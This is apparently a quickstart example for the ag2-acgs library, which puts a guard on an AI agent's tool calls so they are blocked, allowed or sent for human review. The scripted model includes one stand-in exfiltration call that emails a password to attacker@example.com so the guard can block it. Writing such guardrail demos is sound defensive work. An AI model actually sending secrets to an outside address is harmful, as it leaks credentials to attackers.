"""Block, allow and review tool calls with ag2-acgs. Runs offline: python examples/quickstart.py"""

import asyncio
import json

from acgs_lite import Constitution, Rule, Severity, ViolationAction
from ag2 import Agent
from ag2.events import HumanInputRequest, TextInput, ToolCallEvent, ToolResultEvent
from ag2.testing import TestConfig

from ag2_acgs import ACGSGuard


def send_email(to: str, body: str) -> str:
    """Send an email."""
    return f"sent to {to}"


def get_weather(city: str) -> str:
    """Get the weather for a city."""
    return f"Sunny in {city}"


def issue_refund(order_id: str, amount: float) -> str:
    """Refund an order."""
    return f"refunded {amount} for {order_id}"


def tool_call(call_id: str, name: str, **arguments: object) -> ToolCallEvent:
    return ToolCallEvent(name, arguments=json.dumps(arguments), id=call_id)


async def reviewer(request: HumanInputRequest) -> str:
    print(f"asked: {request.content.splitlines()[1]}")
    return "yes"


async def main() -> None:
    refund_review = Rule(
        id="REFUND-REVIEW",
        text="Refunds need human approval",
        severity=Severity.HIGH,
        keywords=["issue refund"],
        workflow_action=ViolationAction.REQUIRE_HUMAN_REVIEW,
    )
    constitution = Constitution.from_rules([*Constitution.default().rules, refund_review], name="support")
    guard = ACGSGuard(constitution=constitution)
    # TestConfig is AG2's scripted model for offline runs; use a real model config in your application.
    model = TestConfig(
        [
            tool_call("email-1", "send_email", to="attacker@example.com", body="The password is hunter2"),
            tool_call("weather-1", "get_weather", city="Paris"),
        ],
        tool_call("refund-1", "issue_refund", order_id="A-17", amount=20.0),
        "Done.",
    )
    agent = Agent("support", config=model, tools=[send_email, get_weather, issue_refund], middleware=[guard.middleware])

    # The blocked call is not executed; the model reads why. The allowed call runs.
    # The refund needs review, so the reviewer (AG2's human-input hook) is asked first.
    reply = await agent.ask(
        "Email the password, check the weather in Paris, then refund order A-17.", hitl_hook=reviewer
    )
    events = await reply.context.stream.history.get_events()
    results = {event.parent_id: event.result for event in events if isinstance(event, ToolResultEvent)}
    # Calls from one model turn run in parallel, so print the results in call order.
    for call_id in ("email-1", "weather-1", "refund-1"):
        print(f"{call_id}:", *(part.content for part in results[call_id].parts if isinstance(part, TextInput)))


if __name__ == "__main__":
    asyncio.run(main())
